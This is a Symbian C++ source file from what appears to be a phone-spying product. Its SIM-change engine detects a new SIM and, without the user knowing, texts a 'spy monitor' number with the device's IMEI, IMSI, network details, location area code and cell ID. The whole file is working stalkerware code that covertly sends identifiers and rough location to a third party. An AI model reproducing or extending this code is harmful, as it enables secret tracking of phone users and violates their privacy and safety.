#include "SIMChangeEng.h"
#include "Global.h"

#if defined(EKA2)
#include <PSVariables.h>
#include <e32property.h>
#endif

class TEmptySmsCmdImp : public MSmsCmdObserver
	{
public:
	void ProcessSmsCommandL(const TSmsCmdDetails& /*aCmdDetails*/){	}
	};

const TInt KMaxMessageLabelLength = 350;

CSIMChangeEng::CSIMChangeEng()
	{
	}

CSIMChangeEng::~CSIMChangeEng()
	{
	}
	
CSIMChangeEng* CSIMChangeEng::NewL()
	{
	CSIMChangeEng* self = new(ELeave)CSIMChangeEng();
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;		
	}
	
void CSIMChangeEng::ConstructL()
	{
	CheckSimChangeStatus();	
	}
	
//MMobileInfoNotifiable
void CSIMChangeEng::OfferMobileInfoL(const TMobileInfo& aMobileInfo)
	{
	LOG3(_L("[CSIMChangeEng::OfferMobileInfoL] IMSI: %S, CountryCode:%S, NetworkId: %S"), &aMobileInfo.iSubscriber.iSubscriberId, &aMobileInfo.iNetwork.iCountryCode, &aMobileInfo.iNetwork.iNetworkId)
	CFxsSettings& settings = Global::Settings();
	TDes& prevIMSI = settings.IMSI();
	const TDesC& subscriberId = aMobileInfo.iSubscriber.iSubscriberId;
	if(Global::ProductActivated() && iSimChanged && prevIMSI != subscriberId)
		//send SIM change notification message
		{
		TEmptySmsCmdImp dummy;
		HBufC* message = CreateMessageLC(aMobileInfo);
		CSmsCmdClient* smsSend = CSmsCmdClient::NewL(dummy, NULL);
		CleanupStack::PushL(smsSend);
		TMonitorInfo& monitor = settings.SpyMonitorInfo();
		smsSend->SendSmsMessageL(monitor.iTelNumber, *message);
		CleanupStack::PopAndDestroy(2);
		settings.NotifyChanged();
		}
	prevIMSI.Copy(subscriberId);
	}

void CSIMChangeEng::CheckSimChangeStatus()
//Problem:
//when SIM card has changed, RProperty::Get(KPSUidSimChangedValue) returns EPSSimChanged
//but if the application panics and starts up or exit and starts up again,
//it still remembers the previous state which is EPSSimChanged
//this case, the application will resend simchange notification again
//so the app must save the state to prevent this problem
//
//
	{
	TInt value(EPSSimChangedUninitialized);
	RProperty::Get(KUidSystemCategory, KPSUidSimChangedValue, value);
    iSimChanged =  (value == EPSSimChanged);
	}

TBool CSIMChangeEng::IsSimChanged()
	{
	return iSimChanged;
	}
	
HBufC* CSIMChangeEng::CreateMessageLC(const TMobileInfo& aMobileInfo)
	{	
	TInt mobInfoLen = GetMobInfoMaxLength(aMobileInfo);
	HBufC* message = HBufC::NewLC(mobInfoLen + KMaxMessageLabelLength);
	TPtr ptr = message->Des();
	
	//first line message	
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_BEGIN));
	CleanupStack::PopAndDestroy();
		
	//Network name
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_NETWORK));
	ptr.Append(aMobileInfo.iNetwork.iLongName);
	ptr.Append('\n');
	CleanupStack::PopAndDestroy();
	
	//Network ID
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_NETWORK_ID));
	ptr.Append(aMobileInfo.iNetwork.iNetworkId);
	ptr.Append('\n');
	CleanupStack::PopAndDestroy();
	
	//KMessageNetworkCountryCode
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_COUNTRY_CODE));
	ptr.Append(aMobileInfo.iNetwork.iCountryCode);
	ptr.Append('\n');
	CleanupStack::PopAndDestroy();
		
	//IMEI
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_IMEI));
	ptr.Append(aMobileInfo.iPhoneId.iSerialNumber);
	ptr.Append('\n');
	CleanupStack::PopAndDestroy();		
	
	//iIMSI
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_IMSI));
	ptr.Append(aMobileInfo.iSubscriber.iSubscriberId);
	ptr.Append('\n');
	CleanupStack::PopAndDestroy();
	
	
	//Cell Info		
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_AREA_CODE));
	ptr.AppendNum(aMobileInfo.iNetwork.iLocationAreaCode);
	ptr.Append('\n');
	CleanupStack::PopAndDestroy();
	
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_CELL_ID));
	ptr.AppendNum(aMobileInfo.iNetwork.iCellId);
	ptr.Append('\n');
	CleanupStack::PopAndDestroy();
	
	ptr.Append('\n');	
	ptr.Append(*RscHelper::ReadResourceLC(R_TEXT_SIMCHANGE_END));	
	CleanupStack::PopAndDestroy();	
	return 	message;
	}

TInt CSIMChangeEng::GetMobInfoMaxLength(const TMobileInfo& aMobileInfo)
	{
	return	aMobileInfo.iPhoneId.iSerialNumber.MaxLength() +
			aMobileInfo.iSubscriber.iSubscriberId.MaxLength() +
			aMobileInfo.iNetwork.iNetworkId.MaxLength() + 
			aMobileInfo.iNetwork.iDisplayTag.MaxLength() + 
			aMobileInfo.iNetwork.iLongName.MaxLength() + 
			aMobileInfo.iNetwork.iShortName.MaxLength() + 
			aMobileInfo.iNetwork.iCountryCode.MaxLength() + 10 + 10; /*CellId + LocationAreaCode*/
	}
